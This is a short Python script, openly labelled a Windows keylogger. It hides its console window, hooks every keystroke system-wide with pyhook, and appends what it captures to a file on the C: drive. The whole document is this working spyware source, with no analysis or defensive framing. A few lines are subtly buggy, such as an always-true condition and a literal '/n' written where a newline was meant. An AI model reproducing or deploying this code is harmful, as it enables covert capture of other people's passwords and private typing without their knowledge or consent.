# Python code for keylogger
# to be used in windows
from os import _exit

import win32api
import win32console
import win32gui
import pythoncom, pyhook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnKeyboardEvent(event):
	if event.Ascii==5:
		_exit(1)
	if event.Ascii !=0 or 8:
		f = open('c:\output.txt', 'r+')                   #open output.txt to read current keystrokes
		buffer = f.read()
		f.close()

		f = open('c:\output.txt', 'w')              # open output.txt to write current + new keystrokes
		keylogs = chr(event.Ascii)
		if event.Ascii == 13:
			keylogs = '/n'
		buffer += keylogs
		f.write(buffer)
		f.close()
# create a hook manager object
hm = pyhook.HookManager()
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
